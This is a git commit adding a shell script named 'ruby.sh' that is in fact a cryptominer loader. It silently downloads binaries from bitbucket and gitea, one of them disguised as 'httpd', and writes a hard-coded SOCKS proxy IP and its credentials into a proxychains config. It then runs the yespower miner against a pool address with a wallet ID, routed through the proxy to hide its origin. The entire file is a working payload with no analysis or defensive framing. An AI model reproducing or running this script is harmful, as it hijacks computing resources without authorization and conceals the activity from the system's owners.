f07e9e5ec1a669a15956ada1f55c9f66bd5d5342
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-12 09:05:02 +0700

    Create ruby.sh

---
+++ ruby.sh
@@ -0,0 +1,22 @@
+proxy="103.120.19.136" 
+port="443" 
+user="erl"  
+pass="1234" 
+wget -q -O xza https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x xza
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./xza -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-0 -n 1)dikamahesa) --timeout 120 -p c=SWAMP,mc=VHH  --proxy=socks5://erl:1234@103.120.19.136:443
